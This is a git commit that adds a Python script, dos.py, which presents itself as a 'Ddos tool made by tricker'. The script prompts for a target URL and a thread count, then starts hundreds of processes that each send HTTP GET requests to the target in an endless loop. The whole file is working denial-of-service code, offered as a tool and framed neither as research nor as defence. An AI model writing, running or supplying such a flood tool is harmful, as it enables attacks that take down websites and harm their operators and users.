c1f86843c3f68584195865f08868ada7f5e6166d
oo-ozo <55140388+oo-ozo@users.noreply.github.com>
2020-10-25 15:12:07 +0630

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,39 @@
+from os import system
+import requests
+import time
+from multiprocessing import Process as P
+
+system('dialog --menu \'ddos list\' 10 30 1 1 requets(made by whoami) 2> log')
+
+log = open('log', 'r')
+logr = log.read()
+system('clear')
+if logr == '1':
+    system('dialog --title \'Ddos tool made by tricker\' --inputbox \'Enter url \' 10 40 2> url')
+            #system('dialog --msgbox \'your url is :\''+u.read()+' 5 50')
+    system('dialog --title \'Ddos tool made by tricker\' --inputbox \'Enter thread(default 400) \' 10 40 2> thread')
+    system('clear')
+    with open('url', 'r') as u:
+        ure = u.read()
+        with open('thread', 'r') as r:
+            thr = r.read()
+            system('dialog --title \'Ddos tool made by tricker\' --msgbox \'url :'+ure+'\nThread :'+thr+'\nport :80\' 20 50')
+            system('clear')
+            def main():
+                p = requests.get(ure)
+                print(p)
+
+            def attack():
+                while True:
+                    main()
+
+            for i in range(int(thr)):
+                t=P(target=attack)
+                t.start()
+    
+    
+            
+
+            
+            
+            
